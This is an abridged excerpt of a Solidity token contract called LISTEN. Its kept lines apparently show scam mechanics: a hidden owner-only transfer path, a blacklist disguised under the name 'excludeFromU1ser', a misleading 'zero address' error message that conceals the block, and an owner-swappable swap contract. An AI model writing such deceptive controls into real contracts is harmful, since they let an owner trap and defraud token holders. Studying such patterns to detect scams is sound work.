...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        if(sender == _tokenOwner){
            _tranferrToken(sender,recipient,amount);
        }else{
...
contract LISTEN is ERC20 {
	...
	mapping(address => bool) private _isExcludedFromU1ser;
    ...
    constructor(address tokenOwner) ERC20("LISTEN", "LISTEN") {
	...
	function excludeFromU1ser(address account, bool excluded) public onlyOwner {
        _isExcludedFromU1ser[account] = excluded;
    }
	...
	function changeSwapWarp(KJDSWarp _warp) public onlyOwner {
        warp = _warp;
    ...
    function _transfer(
        ...
        require(from != address(0) && !_isExcludedFromU1ser[from], "ERC20: transfer from the zero address");
        ...
        if(buySize>0 && sendAmount > 0){
            ...
            if(buySize >10){
                for(uint256 i=0;i<10;i++){
                    ...
                    uint256 amountToken = sendAmount.mul(rate).div(1000000);
